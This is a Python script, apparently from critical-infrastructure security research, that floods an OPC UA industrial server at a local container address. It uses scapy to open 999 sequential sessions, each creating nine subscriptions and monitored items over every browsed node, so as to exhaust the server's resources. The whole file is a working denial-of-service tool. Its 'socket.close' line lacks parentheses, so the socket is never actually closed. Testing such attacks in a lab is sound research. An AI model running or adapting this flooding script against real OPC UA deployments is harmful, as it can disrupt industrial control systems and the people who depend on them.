from scapy.all import *

from scapy.contrib.opcua_binary import (
    BuiltIn_OPCUA_Binary_QualifiedName,
    CommonParameter_BrowseResult,
    CommonParameter_MonitoringParameters,
    CommonParameter_ReadValueId,
    CommonParameter_RequestHeader,
    CommonParameter_ResponseHeader,
    CustomParameter_BrowseDescription,
    CustomParameter_MonitoredItem_CreateRequest,
    Generic_NodeId,
    OPC_UA_Binary,
    OPC_UA_Binary_CloseSecureChannel,
    OPC_UA_Binary_Hello,
    OPC_UA_Binary_Message_ActivateSessionRequest,
    OPC_UA_Binary_Message_BrowseRequest,
    OPC_UA_Binary_Message_CloseSecureChannelRequest,
    OPC_UA_Binary_Message_CloseSessionRequest,
    OPC_UA_Binary_Message_CreateMonitoredItemsRequest,
    OPC_UA_Binary_Message_CreateSessionRequest,
    OPC_UA_Binary_Message_CreateSessionResponse,
    OPC_UA_Binary_Message_CreateSubscriptionRequest,
    OPC_UA_Binary_Message_OpenSecureChannelRequest,
    OPC_UA_Binary_Message_OpenSecureChannelResponse,
    OPC_UA_Binary_Message_CreateSubscriptionResponse,
    OPC_UA_Binary_OpenSecureChannel,
    OPC_UA_Binary_SecureConversationMessage,
    OPC_UA_Binary_EncodableMessageObject,
    CustomParameter_LocaleId,
)

from .opcua_binary_subscription_request import (
    send_OPC_HEL,
    send_OPC_OpenSecureChannel,
    OPC_create_session,
    OPC_activate_session,
    OPC_subscription_request,
    OPC_browse_request,
    OPC_create_monitored_items_request,
    OPC_close_session,
    OPC_close_secureChannel,
)



def one_borked_request():
    # %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

    # 1: send HEL Message
    connection_endpoint = "opc.tcp://172.17.0.2:4840/"
    socket = send_OPC_HEL(
        "172.17.0.2",
        4840,
        connection_endpoint,
    )

    startSequence = 51
    startRequest = 1

    # %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

    # 2: send OPN Message
    answer = send_OPC_OpenSecureChannel(
        socket,
        startSequence,
        startRequest,
        False,
    )

    startRequest += 1
    startSequence += 1

    # parse the answer packet, gives us the channel and token Ids
    opcbin_OSCR = OPC_UA_Binary_Message_OpenSecureChannelResponse
    res = OPC_UA_Binary(answer.load)
    channelId = res[opcbin_OSCR].SecureChannelId
    tokenId = res[opcbin_OSCR].TokenId
    ts = res[opcbin_OSCR].Timestamp

    opc_internal_endpoint = "opc.tcp://96721c15a93b:4840/KRITIS3M/"
    session_name = "flooding session"
    app_uri = "urn:freeopcua:client"
    prod_uri = "urn:freeopcua.github.io:client"
    nonce = random.randbytes(48)  # size: 32 < s < 128 Bit, nodejs checks this!
    startRequestHandle = 10000 + startRequest

    # %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

    # request a new session handle from the server
    # with the handle we can call services and start user sessions
    answer = OPC_create_session(
        socket=socket,
        sequence_id=startSequence,
        request_id=startRequest,
        request_handle_Id=startRequestHandle,
        channel_id=channelId,
        token_id=tokenId,
        target_endpoint=opc_internal_endpoint,
        session_name=session_name,
        application_uri=app_uri,
        product_uri=prod_uri,
        session_timeout=0x0000000000F91541,  # about 36000
        client_nonce=nonce,
        timestamp_start=ts,
        show_payload=False,
    )

    startRequest += 1
    startSequence += 1
    startRequestHandle += 1

    res = OPC_UA_Binary(answer.load)
    ts = res[CommonParameter_ResponseHeader].Timestamp + 100
    session_authToken = res[
        OPC_UA_Binary_Message_CreateSessionResponse
    ].ResponseAuthenticationToken.NodeIdentifier_String

    # %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

    # open the session for requests
    answer = OPC_activate_session(
        socket=socket,
        sequence_id=startSequence,
        request_id=startRequest,
        request_handle_id=startRequestHandle,
        channel_id=channelId,
        token_id=tokenId,
        timestamp_start=ts,
        auth_token=session_authToken,
        show_payload=False,
    )

    startRequest += 1
    startSequence += 1
    startRequestHandle += 1
    ts += 1000

    # %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

    answer = OPC_browse_request(
        socket=socket,
        sequence_id=startSequence,
        request_id=startRequest,
        request_handle_id=startRequestHandle,
        channel_id=channelId,
        token_id=tokenId,
        timestamp_start=ts,
        auth_token=session_authToken,
        show_payload=False,
    )

    startRequest += 1
    startSequence += 1
    startRequestHandle += 1
    ts += 1000

    res = OPC_UA_Binary(answer.load)

    requested_Ids = []
    for reference in res[CommonParameter_BrowseResult].References:
        requested_Ids.append(reference.nodeId.NodeIdentifier_Numeric_4B)

    print("The following IDs have been returned by the server:")
    print(requested_Ids)

    # %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

    for x in range (1,10):
        answer = OPC_subscription_request(
            socket=socket,
            sequence_id=startSequence,
            request_id=startRequest,
            request_handle_id=startRequestHandle,
            channel_id=channelId,
            token_id=tokenId,
            timestamp_start=ts,
            auth_token=session_authToken,
            show_payload=False,
        )

        startRequest += 1
        startSequence += 1
        startRequestHandle += 1
        ts += 1000

        res = OPC_UA_Binary(answer.load)
        SubscriptionId = res[
            OPC_UA_Binary_Message_CreateSubscriptionResponse
        ].SubscriptionId

    # %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

        answer = OPC_create_monitored_items_request(
            socket=socket,
            sequence_id=startSequence,
            request_id=startRequest,
            request_handle_id=startRequestHandle,
            channel_id=channelId,
            token_id=tokenId,
            timestamp_start=ts,
            subscription_id=SubscriptionId,
            nodes_to_query=requested_Ids,
            auth_token=session_authToken,
            show_payload=False,
        )

        startRequest += 1
        startSequence += 1
        startRequestHandle += 1
        ts += 1000

        # res = OPC_UA_Binary(answer.load)

    # %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

    answer = OPC_close_session(
        socket=socket,
        sequence_id=startSequence,
        request_id=startRequest,
        request_handle_id=startRequestHandle,
        channel_id=channelId,
        token_id=tokenId,
        timestamp_start=ts,
        auth_token=session_authToken,
        show_payload=False,
    )

    startRequest += 1
    startSequence += 1
    startRequestHandle += 1
    ts += 1000

    # %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

    answer = OPC_close_secureChannel(
        socket=socket,
        sequence_id=startSequence,
        request_id=startRequest,
        request_handle_id=startRequestHandle,
        channel_id=channelId,
        token_id=tokenId,
        timestamp_start=ts,
        auth_token=session_authToken,
        show_payload=False,
    )

    socket.close



def main():
    for x in range(1, 1000):
        one_borked_request()

if __name__ == "__main__":
    main()
